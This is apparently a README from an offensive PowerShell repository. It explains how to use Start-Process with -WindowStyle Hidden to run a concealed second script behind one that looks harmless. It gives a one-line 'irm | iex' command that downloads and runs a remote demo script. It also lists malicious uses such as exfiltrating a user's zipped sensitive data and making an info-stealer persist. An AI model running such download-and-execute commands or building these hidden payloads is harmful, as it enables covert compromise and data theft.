This method uses the -WindowStyle option on Start-Process to run a second script completely hidden and detatched from the first one. The first script can do what is advertised, while the second script does something malicious.

If you want to see an example in action, you can run the included script, **after** looking at it to see what it does

```PowerShell
irm https://raw.githubusercontent.com/starchyunderscore/offensive-ps/main/method-1/run.ps1 | iex
```

The included example runs a few Write-Output commands, then exits the powershell window. Ten seconds later, the calculator will pop up.

What this could do instead of just opening the calculator:
- Download an exe and run it
- Download an exe and replace another exe with it, so that the next time that program is run it runs the payload
- Copy all of a user's sensitive data to a folder, zip it, and send that zip to a server
- Edit the startup of powershell to download and run a script, so that the attacker can run an updated info-stealer every time powershell is launched
- Almost anything else you can think of

Score:
Versitility: 9/10 : can run almost anything
Difficulty to spot 2/10 : easy to spot if you just read the script before running it.
Overall: 11/20 : can do a lot, but only to people in the small intersection of needing to run something in powershell and not being tech savvy enough to take a cursory glance at the code
